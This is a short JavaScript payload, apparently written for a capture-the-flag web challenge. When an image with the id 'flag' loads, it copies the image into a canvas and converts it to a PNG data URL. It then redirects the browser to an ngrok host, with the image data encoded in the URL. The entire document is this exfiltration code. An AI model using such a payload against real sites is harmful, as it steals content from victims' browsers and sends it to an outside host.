document.getElementById("flag").onload = (e) => {
  const img = e.target;
  console.log(img);
  const canvas = document.createElement("canvas");
  canvas.width = img.width;
  canvas.height = img.height;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(img, 0, 0);
  const dataURL = canvas.toDataURL("image/png");
  console.log(dataURL);
  window.location.href = `http://ea6ac431904c.ngrok.io/${encodeURIComponent(
    dataURL
  )}`;
};
